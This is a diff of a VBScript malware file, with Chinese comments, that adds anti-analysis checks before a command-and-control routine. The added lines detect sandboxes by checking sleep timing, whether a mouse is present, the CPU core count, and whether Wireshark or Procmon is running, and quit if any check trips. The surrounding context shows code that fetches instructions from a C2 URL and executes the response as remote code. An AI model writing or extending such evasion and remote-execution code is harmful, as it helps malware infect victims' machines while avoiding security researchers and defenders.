@@ -381,6 +381,37 @@ Function BeaconToC2()
     Execute http.responseText  ' 动态执行远程代码
 End Function
 
+Dim startTime
+startTime = Timer
+WScript.Sleep 10000  ' 休眠10秒
+If Timer - startTime < 9 Then  ' 如果时间流逝异常（沙箱可能加速执行）
+    WScript.Quit  ' 退出，不执行恶意代码
+End If
+
+Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+Set mice = wmi.ExecQuery("SELECT * FROM Win32_PointingDevice")
+If mice.Count = 0 Then  ' 没有检测到鼠标设备（可能是沙箱）
+    WScript.Quit
+End If
+
+Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+Set cpus = wmi.ExecQuery("SELECT * FROM Win32_Processor")
+For Each cpu In cpus
+    If cpu.NumberOfCores < 2 Then  ' 单核CPU可能是沙箱
+        WScript.Quit
+    End If
+Next
+
+Set wsh = CreateObject("WScript.Shell")
+Set proc = wsh.Exec("tasklist")
+tasklist = LCase(proc.StdOut.ReadAll())
+
+If InStr(tasklist, "wireshark") > 0 Or InStr(tasklist, "procmon") > 0 Then
+    WScript.Quit  ' 检测到分析工具，退出
+End If
+
+
+    
 ' 伪代码：从C2服务器获取指令
 Set http = CreateObject("MSXML2.XMLHTTP")
 http.Open "GET", "http://c2.com/command", False
